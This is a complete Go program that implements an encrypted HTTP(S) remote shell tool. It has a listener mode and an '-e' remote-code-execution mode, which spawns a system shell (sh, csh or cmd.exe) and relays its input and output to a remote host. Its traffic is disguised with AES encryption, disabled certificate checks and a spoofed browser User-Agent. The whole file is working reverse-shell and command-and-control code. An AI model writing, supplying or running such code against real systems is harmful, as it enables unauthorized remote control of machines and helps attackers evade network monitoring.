package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

const (
	HEADER = "X-ID"
)

var (
	ServerMode bool
	RCEMode    bool
	Address    string
	SSL        bool

	CMDChannel    = make(chan string, 10)
	OutputChannel = make(chan string, 10)

	ClientChannel = make(chan string, 1)

	CurrentID   string
	CheckHealth time.Time

	TIMEOUT        = 10 * time.Second
	TIMEOUT_CLIENT = 30 * time.Second

	stdin io.WriteCloser
)

func main() {
	if ServerMode {
		if RCEMode {
			makeCMD()
			http.HandleFunc("/", handlerReverseClient)
			go func() {
				for {
					time.Sleep(TIMEOUT_CLIENT)
					if !CheckHealth.IsZero() && time.Now().After(CheckHealth.Add(TIMEOUT_CLIENT)) {
						fmt.Printf("\n[Error] client has disconnected\n")
						reset()
					}
				}
			}()
		} else {
			http.HandleFunc("/", handlerClient)

			go func() {
				for {
					<-ClientChannel
					sendCMD()
				}
			}()
		}
		err := http.ListenAndServe(Address, nil)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		url := fmt.Sprintf("http://%s", Address)
		if SSL {
			url = fmt.Sprintf("https://%s", Address)
		}

		id := uuid()
		if RCEMode {
			makeCMD()

			go func() {
				//send output
				for {
					select {
					case out := <-OutputChannel:
						_ = makeRequest(url, http.MethodPost, id, []byte(out))
					}
				}
			}()

			for {
				// get cmd
				for {
					c := makeRequest(url, http.MethodGet, id, nil)
					if len(c) < 1 {
						continue
					}
					runCommand(c)
					break
				}
			}
		} else {
			go func() {
				for {
					makeRequest(url, http.MethodPost, id, nil)
					time.Sleep(TIMEOUT_CLIENT - (2 * time.Second))
				}
			}()

			go func() {
				for {
					o := makeRequest(url, http.MethodGet, id, nil)
					if len(o) > 0 {
						fmt.Printf(o)
					}
				}
			}()

			reader := bufio.NewReader(os.Stdin)
			for {
				text, _ := reader.ReadString('\n')
				_ = makeRequest(url, http.MethodPost, id, []byte(text))
			}
		}
	}

}

func makeCMD() {
	shell := "/bin/sh"
	switch runtime.GOOS {
	case "linux":
		shell = "/bin/sh"
	case "freebsd":
		shell = "/bin/csh"
	case "windows":
		shell = "cmd.exe"
	}
	myCMD := exec.Command(shell)
	stdoutIn, err := myCMD.StdoutPipe()
	if err != nil {
		log.Fatal(err)
	}
	go func() {
		copyAndCapture(stdoutIn)
	}()

	stderrIn, err := myCMD.StderrPipe()
	if err != nil {
		log.Fatal(err)
	}
	go func() {
		copyAndCapture(stderrIn)
	}()

	stdin, err = myCMD.StdinPipe()
	if err != nil {
		log.Fatal(err)
	}

	err = myCMD.Start()
	if err != nil {
		log.Fatal(err)
	}
}

func makeInput(c chan string) chan string {
	go func() {
		defer func() {
			recover()
		}()
		reader := bufio.NewReader(os.Stdin)
		for {
			text, _ := reader.ReadString('\n')
			c <- text
		}
	}()

	return c
}

func updateHealth() {
	CheckHealth = time.Now()
}

func sendCMD() {
	defer reset()

	c := ""
	channelInput := make(chan string)
	go func() {
		for {
			time.Sleep(TIMEOUT_CLIENT)
			if !CheckHealth.IsZero() && time.Now().After(CheckHealth.Add(TIMEOUT_CLIENT)) {
				fmt.Println("client has disconnected")
				close(channelInput)
				return
			}
		}
	}()

	for c = range makeInput(channelInput) {
		CMDChannel <- c
	}
}

func reset() {
	CurrentID = ""
	CheckHealth = time.Time{}

	for len(CMDChannel) > 0 {
		<-CMDChannel
	}

	for len(OutputChannel) > 0 {
		<-OutputChannel
	}

	for len(ClientChannel) > 0 {
		<-ClientChannel
	}
	log.Println("Wait for new Connection")
}

func handlerClient(w http.ResponseWriter, r *http.Request) {
	if !checkClient(r) {
		http.NotFound(w, r)
		return
	}
	updateHealth()

	switch r.Method {
	case http.MethodGet:
		select {
		case c := <-CMDChannel:
			data, _ := encrypt(CurrentID, []byte(c))
			io.WriteString(w, data)
		case <-time.After(TIMEOUT):
			io.WriteString(w, "")
		}
		return
	case http.MethodPost:
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.NotFound(w, r)
			return
		}
		text, err := decrypt(CurrentID, string(body))
		if err == nil {
			fmt.Printf(text)
		}
		io.WriteString(w, "ok")
		return
	}
}

func handlerReverseClient(w http.ResponseWriter, r *http.Request) {
	if !checkClient(r) {
		http.NotFound(w, r)
		return
	}
	updateHealth()

	switch r.Method {
	case http.MethodGet:
		select {
		case c := <-OutputChannel:
			data, _ := encrypt(CurrentID, []byte(c))
			io.WriteString(w, data)
		case <-time.After(TIMEOUT):
			io.WriteString(w, "")
		}
		return
	case http.MethodPost:
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.NotFound(w, r)
			return
		}

		if len(body) > 0 {
			text, err := decrypt(CurrentID, string(body))
			if err == nil {
				runCommand(text)
			}
		}
		io.WriteString(w, "ok")
		return
	}
}

func checkClient(r *http.Request) bool {
	id := r.Header.Get(HEADER)
	if len(id) < 1 {
		return false
	}

	if len(CurrentID) < 1 {
		CurrentID = id
		ClientChannel <- id
		fmt.Println("new client from", r.RemoteAddr)
		return true
	}

	if CurrentID != id {
		return false
	}

	return true
}

func uuid() (uuid string) {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		log.Fatal(err)
		return
	}

	uuid = fmt.Sprintf("%X%X%X%X%X", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])

	return
}

func makeRequest(url, method, id string, payload []byte) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := http.Client{Timeout: 15 * time.Second, Transport: tr}
	payloadEnc := ""
	if len(payload) > 0 {
		var err error
		payloadEnc, err = encrypt(id, payload)
		if err != nil {
			log.Fatal(err)
		}
	}

	req, err := http.NewRequest(method, url, bytes.NewBuffer([]byte(payloadEnc)))
	if err != nil {
		log.Fatal(err)
	}

	req.Header = http.Header{
		"User-Agent": {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.98"},
		HEADER:       {id},
	}

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}

	if res.StatusCode != http.StatusOK {
		log.Fatal(res.StatusCode)
	}

	data, _ := decrypt(id, string(body))

	return data

}

func runCommand(c string) {
	_, err := io.WriteString(stdin, c)
	if err != nil {
		log.Println(err)
	}
}

func encrypt(keyStr string, plainText []byte) (encoded string, err error) {
	key := []byte(keyStr)
	block, err := aes.NewCipher(key)
	if err != nil {
		return
	}

	cipherText := make([]byte, aes.BlockSize+len(plainText))

	iv := cipherText[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)

	return base64.RawStdEncoding.EncodeToString(cipherText), err
}

func decrypt(keyStr string, secure string) (decoded string, err error) {
	key := []byte(keyStr)
	cipherText, err := base64.RawStdEncoding.DecodeString(secure)

	if err != nil {
		return
	}

	block, err := aes.NewCipher(key)

	if err != nil {
		return
	}

	if len(cipherText) < aes.BlockSize {
		err = errors.New("Ciphertext block size is too short!")
		return
	}

	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(cipherText, cipherText)

	return string(cipherText), err
}

func copyAndCapture(r io.Reader) {
	buf := make([]byte, 1024, 1024)
	for {
		n, err := r.Read(buf[:])
		if n > 0 {
			d := buf[:n]
			OutputChannel <- string(d)
		}
		if err != nil {
			if err == io.EOF {
				err = nil
				return
			}
			log.Println(err)
		}
	}
}

func init() {
	flag.BoolVar(&ServerMode, "l", false, "listen mode")
	flag.StringVar(&Address, "s", "0.0.0.0:8080", "address")
	flag.BoolVar(&RCEMode, "e", false, "remote code execution")
	flag.BoolVar(&SSL, "ssl", false, "use https when connect to server")
	flag.Parse()
}
